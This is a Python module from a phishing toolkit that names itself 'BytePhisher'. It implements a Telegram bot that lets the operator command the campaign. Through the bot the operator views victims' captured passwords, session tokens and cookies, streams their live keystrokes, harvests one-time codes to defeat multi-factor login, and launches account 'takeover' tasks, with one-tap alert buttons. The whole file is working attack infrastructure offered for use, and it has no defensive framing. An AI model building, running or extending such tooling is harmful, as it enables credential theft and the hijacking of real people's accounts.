"""Telegram as a control channel, not just an alarm.

The alerts module pushes captures out. This adds the other direction: the
operator drives the campaign from the chat they already live in.

    /stats                 campaign counters
    /sessions              the newest sessions with state and country
    /session <sid>         one session: credentials, tokens, cookies, timeline
    /live <sid>            the live keystroke/field stream (latest per field)
    /otp <sid>             the codes seen in that stream
    /takeover <sid>        run the session's takeover tasks
    /lures                 lure status (issued / opened / converted)
    /block <ip>            refuse an address from now on
    /unblock <ip>          undo it
    /help                  the command list

Alerts carry inline buttons (Takeover / Live / Block) so the common follow-up is
one tap. Every command is a plain function registered by the caller, which keeps
this module free of campaign logic and makes it testable without a network: the
transport is injectable.
"""
import json
import threading
import time

API_BASE = "https://api.telegram.org"
MAX_TEXT = 3900                 # Telegram's limit is 4096; stay under it


def _default_transport(url, payload, timeout=10):
    """POST JSON and return the decoded object.

    core/net.post_json returns (status, body) - the tuple is unpacked here,
    otherwise every reply looked like a failure and no update was ever parsed
    (found by running the CLI against a stub API, not by a unit test).
    """
    from . import net
    res = net.post_json(url, payload, timeout=timeout)
    if isinstance(res, tuple):
        status, body = res[0], (res[1] if len(res) > 1 else b"")
        try:
            text = body.decode("utf-8", "replace") if isinstance(body, (bytes, bytearray)) else str(body)
            return json.loads(text or "{}")
        except Exception:
            return {"ok": False, "description": f"unreadable reply (HTTP {status})"}
    return res


def chunk(text, limit=MAX_TEXT):
    """Split a long message so EVERY part fits the limit.

    A single long line (a captured value, an error) used to be emitted as one
    over-limit part, which Telegram rejects - so the operator silently lost the
    message. Long lines are now hard-split.
    """
    out, cur, size = [], [], 0
    for line in str(text or "").splitlines():
        while len(line) > limit:                 # a line longer than a whole part
            if cur:
                out.append("\n".join(cur))
                cur, size = [], 0
            out.append(line[:limit])
            line = line[limit:]
        if size + len(line) + 1 > limit and cur:
            out.append("\n".join(cur))
            cur, size = [], 0
        cur.append(line)
        size += len(line) + 1
    if cur:
        out.append("\n".join(cur))
    return out or [""]


class C2:
    """Poll Telegram for commands and answer them from a registry."""

    def __init__(self, token, chat_id, api_base=None, transport=None,
                 allowed_chats=None, timeout=10, logger=None):
        self.token = str(token or "").strip()
        self.chat_id = str(chat_id or "").strip()
        self.api_base = (api_base or API_BASE).rstrip("/")
        self.transport = transport or _default_transport
        # only the configured chat may command the bot; a token leak alone must
        # not hand a stranger the campaign
        self.allowed = {str(c) for c in (allowed_chats or [self.chat_id]) if str(c)}
        self.timeout = timeout
        self.log = logger or (lambda *a: None)
        self.commands = {}
        self._offset = 0
        self._stop = threading.Event()

    # ------------------------------------------------------------ registry ---
    def register(self, name, fn, help_text=""):
        """Add a command. `fn(args: list[str]) -> str` (or None for silence)."""
        self.commands[str(name).lower()] = {"fn": fn, "help": help_text}

    def help_text(self):
        lines = ["BytePhisher control", ""]
        for name in sorted(self.commands):
            lines.append(f"/{name} - {self.commands[name]['help'] or ''}".rstrip(" -"))
        return "\n".join(lines)

    # ------------------------------------------------------------ transport --
    def _call(self, method, payload):
        url = f"{self.api_base}/bot{self.token}/{method}"
        try:
            return self.transport(url, payload, self.timeout)
        except Exception as e:
            self.log(f"[c2] {method} failed: {type(e).__name__}: {e}")
            return None

    def send(self, text, chat_id=None, buttons=None):
        """Send a message; `buttons` is [[(label, callback_data), ...], ...]."""
        chat = str(chat_id or self.chat_id)
        payload = {"chat_id": chat, "disable_web_page_preview": True}
        if buttons:
            payload["reply_markup"] = {"inline_keyboard": [
                [{"text": str(lbl), "callback_data": str(data)} for lbl, data in row]
                for row in buttons]}
        sent = 0
        for part in chunk(text):
            payload["text"] = part
            if self._call("sendMessage", payload) is not None:
                sent += 1
        return sent

    def answer_callback(self, callback_id, text=""):
        return self._call("answerCallbackQuery",
                          {"callback_query_id": callback_id, "text": str(text)[:180]})

    def get_updates(self, timeout=0):
        payload = {"offset": self._offset, "timeout": int(timeout),
                   "allowed_updates": ["message", "callback_query"]}
        res = self._call("getUpdates", payload)
        updates = []
        if isinstance(res, dict):
            updates = res.get("result") or []
        for u in updates:
            if isinstance(u, dict) and isinstance(u.get("update_id"), int):
                self._offset = max(self._offset, u["update_id"] + 1)
        return updates

    # ------------------------------------------------------------- parsing ---
    @staticmethod
    def parse(update):
        """(chat_id, text, callback_id) from one update; text is None if none.

        Pure and total: anything unexpected yields (None, None, None) instead of
        raising inside the poll loop.
        """
        if not isinstance(update, dict):
            return None, None, None
        msg = update.get("message") or update.get("edited_message")
        if isinstance(msg, dict):
            chat = (msg.get("chat") or {}).get("id")
            text = msg.get("text")
            return (str(chat) if chat is not None else None,
                    str(text) if text is not None else None, None)
        cb = update.get("callback_query")
        if isinstance(cb, dict):
            chat = ((cb.get("message") or {}).get("chat") or {}).get("id")
            return (str(chat) if chat is not None else None,
                    str(cb.get("data") or ""), str(cb.get("id") or ""))
        return None, None, None

    @staticmethod
    def split_command(text):
        """('/session abc123 extra') -> ('session', ['abc123', 'extra'])."""
        t = str(text or "").strip()
        if t.startswith("/"):
            t = t[1:]
        parts = t.split()
        if not parts:
            return "", []
        name = parts[0].split("@")[0].lower()          # /cmd@BotName
        return name, parts[1:]

    # ------------------------------------------------------------ dispatch ---
    def dispatch(self, chat_id, text):
        """Run one command. Returns the reply text (or None)."""
        if str(chat_id) not in self.allowed:
            self.log(f"[c2] ignored command from chat {chat_id} (not the operator)")
            return None
        name, args = self.split_command(text)
        if not name:
            return None
        if name in ("start", "help"):
            return self.help_text()
        entry = self.commands.get(name)
        if not entry:
            return f"unknown command: /{name}\n\n" + self.help_text()
        try:
            out = entry["fn"](args)
        except Exception as e:
            self.log(f"[c2] /{name} failed: {type(e).__name__}: {e}")
            return f"/{name} failed: {type(e).__name__}: {e}"
        return out

    def handle_update(self, update):
        """Process one update end to end; returns the reply that was sent."""
        chat_id, text, callback_id = self.parse(update)
        if callback_id is not None and text is not None:
            # an inline button carries the command as its callback data
            self.answer_callback(callback_id, "working")
        if chat_id is None or text is None:
            return None
        reply = self.dispatch(chat_id, text)
        if reply:
            self.send(reply, chat_id=chat_id)
        return reply

    # ---------------------------------------------------------------- loop ---
    def run_forever(self, poll_timeout=25, on_error_sleep=5):
        self._stop.clear()
        while not self._stop.is_set():
            try:
                updates = self.get_updates(timeout=poll_timeout)
            except Exception as e:
                self.log(f"[c2] poll failed: {type(e).__name__}: {e}")
                updates = []
                time.sleep(on_error_sleep)
            for u in updates:
                try:
                    self.handle_update(u)
                except Exception as e:
                    self.log(f"[c2] update failed: {type(e).__name__}: {e}")
        return True

    def start(self, poll_timeout=25):
        t = threading.Thread(target=self.run_forever, kwargs={"poll_timeout": poll_timeout},
                             daemon=True)
        t.start()
        return t

    def stop(self):
        self._stop.set()


# --------------------------------------------------------------- rendering ---
def render_sessions(rows, limit=12):
    """Compact list of the newest sessions."""
    if not rows:
        return "no sessions yet"
    out = ["sessions (newest first)"]
    for r in rows[:limit]:
        bits = [str(r.get("sid", ""))[:12], str(r.get("state") or "-"),
                str(r.get("ip") or "-")]
        geo = ", ".join(x for x in [r.get("city"), r.get("country")] if x)
        if geo:
            bits.append(geo)
        # db.session_list() gives counts, a vault record gives the dict itself
        creds = r.get("credentials") or r.get("creds") or 0
        if isinstance(creds, dict):
            creds = ",".join(sorted(creds)) if creds else 0
        if creds:
            bits.append(f"creds:{creds}")
        cookies = r.get("cookies")
        if cookies:
            bits.append(f"cookies:{len(cookies) if isinstance(cookies, (list, dict)) else cookies}")
        out.append("  " + " | ".join(bits))
    return "\n".join(out)


def render_session(rec):
    """One session in full: credentials, tokens, cookies, timeline."""
    if not rec:
        return "session not found"
    L = [f"session {rec.get('sid')}", f"state   : {rec.get('state') or '-'}",
         f"phishlet: {rec.get('phishlet') or '-'}  campaign: {rec.get('campaign') or '-'}",
         f"ip      : {rec.get('ip') or '-'}  "
         + ", ".join(x for x in [rec.get("city"), rec.get("country")] if x)]
    creds = rec.get("credentials") or {}
    if creds:
        L.append("credentials:")
        L += [f"  {k} = {v}" for k, v in creds.items()]
    if rec.get("tokens"):
        L.append("tokens  : " + ", ".join(sorted(rec["tokens"])))
    cookies = rec.get("cookies") or []
    if cookies:
        L.append(f"cookies : {len(cookies)}")
        for c in cookies[:12]:
            L.append(f"  {c.get('name')} @ {c.get('domain') or '-'}")
    if rec.get("device_token"):
        L.append(f"device  : {rec['device_token']}")
    for ev in (rec.get("timeline") or [])[-8:]:
        L.append(f"  {ev.get('what')}: {str(ev.get('detail'))[:80]}")
    return "\n".join(L)


def render_live(events, limit=14):
    """The live stream as the operator wants it: the latest value per field."""
    from . import intel as _intel
    summary = _intel.live_summary(events or [])
    if not summary["fields"]:
        return "no live input recorded"
    L = ["live input (latest per field)"]
    for f in summary["fields"][:limit]:
        flag = "  <- one-time code" if f.get("otp") else ""
        L.append(f"  {f['name']} [{f.get('type') or '?'}] = {f.get('value')}{flag}")
    if summary["otp_seen"]:
        L.append("codes seen: " + ", ".join(summary["otp_seen"]))
    return "\n".join(L)


def render_otp(events):
    """Only the one-time codes from a live stream, in order."""
    codes = []
    for ev in events or []:
        if ev.get("k") == "input" and ev.get("v"):
            codes.append((ev.get("n") or "?", ev["v"], ev.get("ms")))
    if not codes:
        return "no input recorded"
    return "codes / input seen:\n" + "\n".join(
        f"  {n} = {v}" + (f" (at {ms}ms)" if ms is not None else "") for n, v, ms in codes[-10:])


def alert_buttons(sid, kind=""):
    """Inline keyboard for an alert."""
    rows = [[("Takeover", f"/takeover {sid}"), ("Live", f"/live {sid}")],
            [("Session", f"/session {sid}"), ("Block IP", f"/blockip {sid}")]]
    if kind == "otp":
        rows.insert(0, [("Show codes", f"/otp {sid}")])
    return rows
